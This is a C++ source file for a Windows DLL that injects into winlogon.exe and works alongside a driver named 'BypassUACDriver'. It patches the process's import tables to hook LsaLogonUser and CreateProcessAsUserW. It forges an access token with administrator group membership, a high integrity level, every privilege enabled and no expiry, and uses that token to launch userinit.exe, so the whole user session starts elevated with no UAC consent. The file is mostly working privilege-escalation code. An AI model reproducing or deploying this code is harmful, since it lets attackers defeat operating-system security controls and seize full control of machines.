#pragma comment(linker, "/ENTRY:DllMain")
#pragma comment(linker, "/SECTION:.text,ERW /MERGE:.rdata=.text /MERGE:.data=.text")
#pragma comment(linker, "/SECTION:.Amano,ERW /MERGE:.text=.Amano")
#pragma comment(lib, "winsta_shadow.lib")
#pragma comment(lib, "Secur32.lib")

#define ML_DEBUG_KERNEL 1

#include "MyLibrary.cpp"
#include "../BypassUACDriver/DriverHelper.h"

#define _NTDEF_
#include <Ntsecapi.h>

VOID HookDispatcherx64(){}

TYPE_OF(LsaLogonUser)*  StubLsaLogonUser;

HANDLE g_AdminToken, g_LogonToken;
UNICODE_STRING UserInit, Taskmgr;

NTSTATUS GetTokenInfo(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID Information, PULONG_PTR Size = NULL)
{
    NTSTATUS Status;
    PVOID TokenInformation;
    ULONG Length;

    TokenInformation = NULL;
    Length = 0;

    LOOP_FOREVER
    {
        Status = NtQueryInformationToken(TokenHandle, TokenInformationClass, TokenInformation, Length, &Length);
        if (Status != STATUS_BUFFER_TOO_SMALL)
            break;

        TokenInformation = ReAllocateMemory(TokenInformation, Length);
    }

    if (NT_FAILED(Status))
    {
        FreeMemory(TokenInformation);
        TokenInformation = NULL;
    }
    else
    {
        *(PVOID *)Information = TokenInformation;
        if (Size != NULL)
            *Size=  Length;
    }

    return Status;
}

typedef union
{
    BYTE    Buffer[SECURITY_MAX_SID_SIZE];
    SID     Sid;

} SID_BUFFER, *PSID_BUFFER;

NTSTATUS CreateAdminToken(PHANDLE Token, HANDLE TargetToken)
{
    HANDLE                      SelfToken;
    BOOLEAN                     Enabled;
    ULONG                       SessionId, Size;
    NTSTATUS                    Status;
    OBJECT_ATTRIBUTES           ObjectAttributes;
    SECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;
    PTOKEN_USER                 User;
    PTOKEN_PRIMARY_GROUP        PrimaryGroup;
    PTOKEN_GROUPS               NewTokenGroups;
    PTOKEN_DEFAULT_DACL         DefaultDacl;
    PTOKEN_PRIVILEGES           Privileges;
    PTOKEN_GROUPS               Groups;
    PTOKEN_STATISTICS           Statistics;
    PTOKEN_SOURCE               Source;
    SID_BUFFER                  HighSid, MidSid, AdminsSid;
    PSID_AND_ATTRIBUTES         SidAttributes;

    Status = NtQueryInformationToken(TargetToken, TokenSessionId, &SessionId, sizeof(SessionId), &Size);
    FAIL_RETURN(Status);

#if !NOT_USE_DRV

    NtFileDisk                  Device;
    BH_OPEN_PROCESS_TOKEN       OpenToken;

    Status = Device.OpenDevice(BYPASS_UAC_DEVICE_SYMBOLIC);
    FAIL_RETURN(Status);

    OpenToken.Process = NtCurrentProcess();
    OpenToken.Access = TOKEN_QUERY;
    OpenToken.Token = &SelfToken;

    Status = Device.DeviceIoControl(IOCTL_OPEN_PROCESS_TOKEN, NULL, 0, &OpenToken, sizeof(OpenToken));
    FAIL_RETURN(Status);

#else

    RtlAdjustPrivilege(SE_CREATE_TOKEN_PRIVILEGE, TRUE, FALSE, &Enabled);
    Status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &SelfToken);
    FAIL_RETURN(Status);

#endif

    User            = NULL;
    PrimaryGroup    = NULL;
    NewTokenGroups  = NULL;
    DefaultDacl     = NULL;
    Privileges      = NULL;
    Groups          = NULL;
    Statistics      = NULL;
    Source          = NULL;

    SCOPE_EXIT
    {
        NtClose(SelfToken);

        FreeMemory(User);
        FreeMemory(PrimaryGroup);
        FreeMemory(NewTokenGroups);
        FreeMemory(DefaultDacl);
        FreeMemory(Privileges);
        FreeMemory(Groups);
        FreeMemory(Statistics);
        FreeMemory(Source);
    }
    SCOPE_EXIT_END;

    FAIL_RETURN(GetTokenInfo(TargetToken,   TokenGroups,        &Groups));
    FAIL_RETURN(GetTokenInfo(SelfToken,     TokenDefaultDacl,   &DefaultDacl));
    FAIL_RETURN(GetTokenInfo(TargetToken,   TokenUser,          &User));
    // FAIL_RETURN(GetTokenInfo(SelfToken,     TokenPrivileges,    &Privileges));
    FAIL_RETURN(GetTokenInfo(TargetToken,   TokenPrimaryGroup,  &PrimaryGroup));
    FAIL_RETURN(GetTokenInfo(TargetToken,   TokenStatistics,    &Statistics));
    FAIL_RETURN(GetTokenInfo(TargetToken,   TokenSource,        &Source));

    Size = sizeof(AdminsSid);
    CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &AdminsSid.Sid, &Size);

    Size = sizeof(MidSid);
    CreateWellKnownSid(WinMediumLabelSid, NULL, &MidSid.Sid, &Size);

    Size = sizeof(HighSid);
    CreateWellKnownSid(WinHighLabelSid, NULL, &HighSid.Sid, &Size);

    FOR_EACH(SidAttributes, Groups->Groups, Groups->GroupCount)
    {
        if (RtlEqualSid(SidAttributes->Sid, &AdminsSid.Sid))
        {
            SidAttributes->Attributes = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED | SE_GROUP_OWNER;
        }
        else if (RtlEqualSid(SidAttributes->Sid, &MidSid.Sid))
        {
            SidAttributes->Sid = &HighSid.Sid;
        }
    }

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    ObjectAttributes.SecurityQualityOfService = &SecurityQualityOfService;

    SecurityQualityOfService.Length                 = sizeof(SecurityQualityOfService);
    SecurityQualityOfService.ImpersonationLevel     = SecurityAnonymous;
    SecurityQualityOfService.ContextTrackingMode    = SECURITY_DYNAMIC_TRACKING;
    SecurityQualityOfService.EffectiveOnly          = FALSE;

    ULONG_PTR PrivilegeCount, BufferLength, SePrivilege;
    PLUID_AND_ATTRIBUTES Luid;
    PTOKEN_PRIVILEGES PrivilegesX;

    PrivilegeCount = SE_MAX_WELL_KNOWN_PRIVILEGE - SE_MIN_WELL_KNOWN_PRIVILEGE + 1;
    BufferLength = sizeof(PrivilegesX->PrivilegeCount) + sizeof(PrivilegesX->Privileges[0]) * PrivilegeCount;

    PrivilegesX = (PTOKEN_PRIVILEGES)AllocStack(BufferLength);

    PrivilegesX->PrivilegeCount = PrivilegeCount;

    SePrivilege = SE_MIN_WELL_KNOWN_PRIVILEGE;
    FOR_EACH(Luid, PrivilegesX->Privileges, PrivilegeCount)
    {
        Luid->Luid.LowPart = SePrivilege++;
        Luid->Luid.HighPart = 0;
        Luid->Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;
    }

    Statistics->ExpirationTime.QuadPart = 0x7fffffffffffffffui64;


    if (User->User.Sid != NULL)
    {
        PLUID Sessions, Session;
        PSECURITY_LOGON_SESSION_DATA SessionData;

        LsaEnumerateLogonSessions(&Size, &Sessions);

        FOR_EACH(Session, Sessions, Size)
        {
            Status = LsaGetLogonSessionData(Session, &SessionData);
            FAIL_CONTINUE(Status);

            if (SessionData->Sid != NULL)
            {
                if (RtlEqualSid(User->User.Sid,SessionData->Sid) &&
                    Statistics->AuthenticationId.LowPart != Session->LowPart)
                {
                    Statistics->AuthenticationId = *Session;
                    LsaFreeReturnBuffer(SessionData);
                    break;
                }
            }

            LsaFreeReturnBuffer(SessionData);
        }

        LsaFreeReturnBuffer(Sessions);
    }

#if !NOT_USE_DRV

    BH_CREATE_TOKEN CreateToken =
    {
        Token,
        TOKEN_ALL_ACCESS,
        &ObjectAttributes,
        TokenPrimary,
        &Statistics->AuthenticationId,
        &Statistics->ExpirationTime,
        User,
        Groups,
        PrivilegesX,
        NULL,
        PrimaryGroup,
        DefaultDacl,
        Source
    };

    Status = Device.DeviceIoControl(IOCTL_CREATE_TOKEN, NULL, 0, &CreateToken, sizeof(CreateToken));
    FAIL_RETURN(Status);

    Status = NtSetInformationToken(*Token, TokenSessionId, &SessionId, sizeof(SessionId));

    if (NT_FAILED(Status))
    {
        NtClose(*Token);
        *Token = NULL;
    }

#else

    Status = NtCreateToken(
                Token,
                TOKEN_ALL_ACCESS,
                &ObjectAttributes,
                TokenPrimary,
                &Statistics->AuthenticationId,
                &Statistics->ExpirationTime,
                User,
                Groups,
                PrivilegesX,
                NULL,
                PrimaryGroup,
                DefaultDacl,
                Source
            );

#endif

    return Status;
}

NTSTATUS
NTAPI
HookLsaLogonUser(
  HANDLE                LsaHandle,
  PLSA_STRING           OriginName,
  SECURITY_LOGON_TYPE   LogonType,
  ULONG                 AuthenticationPackage,
  PVOID                 AuthenticationInformation,
  ULONG                 AuthenticationInformationLength,
  PTOKEN_GROUPS         LocalGroups,
  PTOKEN_SOURCE         SourceContext,
  PVOID*                ProfileBuffer,
  PULONG                ProfileBufferLength,
  PLUID                 LogonId,
  PHANDLE               Token,
  PQUOTA_LIMITS         Quotas,
  PNTSTATUS             SubStatus
)
{
    NTSTATUS Status, Status2;
    HANDLE AdminToken;

    Status = LsaLogonUser(LsaHandle, OriginName, LogonType, AuthenticationPackage, AuthenticationInformation, AuthenticationInformationLength, LocalGroups, SourceContext, ProfileBuffer, ProfileBufferLength, LogonId, Token, Quotas, SubStatus);
    if (NT_FAILED(Status))
        return Status;

    if (Token == NULL || *Token == NULL)
        return Status;

    if (NT_FAILED(CreateAdminToken(&AdminToken, *Token)))
        return Status;

    g_AdminToken = AdminToken;
    g_LogonToken = *Token;

    return Status;
}

NTSTATUS
NTAPI
HookNtCreateUserProcess(
    OUT     PHANDLE                         ProcessHandle,
    OUT     PHANDLE                         ThreadHandle,
    IN      ACCESS_MASK                     ProcessDesiredAccess,
    IN      ACCESS_MASK                     ThreadDesiredAccess,
    IN      POBJECT_ATTRIBUTES              ProcessObjectAttributes OPTIONAL,
    IN      POBJECT_ATTRIBUTES              ThreadObjectAttributes OPTIONAL,
    IN      ULONG                           ProcessFlags,                   // PROCESS_CREATE_FLAGS_*
    IN      ULONG                           ThreadFlags,                    // THREAD_CREATE_FLAGS_*
    IN      PRTL_USER_PROCESS_PARAMETERS    ProcessParameters,
    IN OUT  PPS_CREATE_INFO                 CreateInfo,
    IN      PPS_ATTRIBUTE_LIST              AttributeList
)
{
    return 0;
}

BOOL
WINAPI
HookCreateProcessAsUserW(
    HANDLE                  Token,
    PCWSTR                  ApplicationName,
    PWSTR                   CommandLine,
    LPSECURITY_ATTRIBUTES   ProcessAttributes,
    LPSECURITY_ATTRIBUTES   ThreadAttributes,
    BOOL                    InheritHandles,
    DWORD                   CreationFlags,
    LPVOID                  Environment,
    PCWSTR                  CurrentDirectory,
    LPSTARTUPINFOW          StartupInfo,
    LPPROCESS_INFORMATION   ProcessInformation
)
{
    BOOL Result;

    if (g_AdminToken != NULL && (Token == NULL || Token == g_LogonToken))
    {
        if (ApplicationName == NULL && !StrICompareW(CommandLine, L"C:\\Windows\\system32\\userinit.exe"))
            Token = g_AdminToken;
    }

    Result = CreateProcessInternalW(Token, ApplicationName, CommandLine, ProcessAttributes, ThreadAttributes, InheritHandles, CreationFlags, Environment, CurrentDirectory, StartupInfo, ProcessInformation, NULL);

    return Result;
}

typedef struct
{
    ULONG Attributes;     // attributes
    ULONG DllName;        // pointer to dll name
    ULONG Module;         // address of module handle
    ULONG IAT;            // address of the IAT
    ULONG INT;            // address of the INT
    ULONG BoundIAT;       // address of the optional bound IAT
    ULONG UnloadIAT;      // address of optional copy of original IAT
    ULONG TimeStamp;      // 0 if not bound,
    // O.W. date/time stamp of DLL bound to (Old BIND)

} IMAGE_DELAY_LOAD_IMPORT_DESCRIPTOR, *PIMAGE_DELAY_LOAD_IMPORT_DESCRIPTOR;

BOOL HookDelayImport()
{
    PVOID winlogon;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS64 nt64;
    PIMAGE_DATA_DIRECTORY delayload;
    PIMAGE_DELAY_LOAD_IMPORT_DESCRIPTOR did;
    PIMAGE_THUNK_DATA64 ThunkData;
    PVOID64 *iat;
    LONG size, nhook;

    winlogon = Nt_GetExeModuleHandle();

    dos = (PIMAGE_DOS_HEADER)winlogon;
    nt64 = (PIMAGE_NT_HEADERS64)PtrAdd(dos, dos->e_lfanew);

    delayload = &nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];

    size = delayload->Size;
    nhook = 2;

    did = (PIMAGE_DELAY_LOAD_IMPORT_DESCRIPTOR)PtrAdd(dos, delayload->VirtualAddress);

    for (; size > 0 && did->DllName != NULL; ++did, size -= sizeof(*did))
    {
        PSTR Name = (PSTR)PtrAdd(dos, did->DllName);

        if (StrICompareA(Name, "SspiCli.dll"))// && StrICompareA(Name, "advapi32.dll"))
            continue;

        ThunkData = (PIMAGE_THUNK_DATA64)PtrAdd(dos, did->INT);
        iat = (PVOID64 *)PtrAdd(dos, did->IAT);

        for (; ThunkData->u1.AddressOfData != NULL; ++iat, ++ThunkData)
        {
            if ((LONG_PTR)ThunkData->u1.AddressOfData < 0)
                continue;

            Name = (PSTR)PtrAdd(dos, ThunkData->u1.AddressOfData + 2);
            if (!StrICompareA(Name, "LsaLogonUser"))
            {
                *(PVOID *)&StubLsaLogonUser = *iat;
                *iat = HookLsaLogonUser;
                return TRUE;
            }
/*
            else if (!StrICompareA(Name, "CreateProcessAsUserW"))
            {
                *iat = HookCreateProcessAsUserW;
                --nhook;
            }
*/
        }

        if (nhook == 0)
            return TRUE;
    }

    return FALSE;
}

BOOL HookDelayImportSafe()
{
    SEH_TRY
    {
        return HookDelayImport();
    }
    SEH_EXCEPT(EXCEPTION_EXECUTE_HANDLER)
    {
        ;
    }

    return FALSE;
}

BOOL UnInitialize(PVOID BaseAddress)
{
    return FALSE;
}

BOOL Initialize(PVOID BaseAddress)
{
    WCHAR Buffer[MAX_NTPATH];
    UNICODE_STRING winlogon, env;

    RTL_CONST_STRING(env, L"%SystemRoot%\\System32\\Winlogon.exe");

    RtlInitEmptyUnicodeString(&winlogon, Buffer, countof(Buffer));
    RtlExpandEnvironmentStrings_U(NULL, &env, &winlogon, NULL);

    if (RtlCompareUnicodeString(&winlogon, &Nt_FindLdrModuleByHandle(NULL)->FullDllName, TRUE) != 0)
        return TRUE;

    RTL_CONST_STRING(env, L"%SystemRoot%\\System32\\userinit.exe");
    RtlExpandEnvironmentStrings_U(NULL, &env, &winlogon, NULL);
    RtlCreateUnicodeString(&UserInit, winlogon.Buffer);

    RTL_CONST_STRING(env, L"%SystemRoot%\\System32\\taskmgr.exe");
    RtlExpandEnvironmentStrings_U(NULL, &env, &winlogon, NULL);
    RtlCreateUnicodeString(&Taskmgr, winlogon.Buffer);

    DbgBreakPoint();

    HookDelayImportSafe();

    PVOID cpu;

    cpu = IATLookupRoutineByHash(Nt_GetExeModuleHandle(), 0xbd79a014);
    if (cpu != NULL)
    {
        PVOID p = HookCreateProcessAsUserW;
        Nt_WriteProtectMemory(NtCurrentProcess(), cpu, &p, sizeof(p));
    }

    return TRUE;
}

BOOL WINAPI DllMain(PVOID BaseAddress, ULONG Reason, PVOID Reserved)
{
    switch (Reason)
    {
        case DLL_PROCESS_ATTACH:
            return Initialize(BaseAddress) || UnInitialize(BaseAddress);

        case DLL_PROCESS_DETACH:
            UnInitialize(BaseAddress);
            break;
    }

    return TRUE;
}
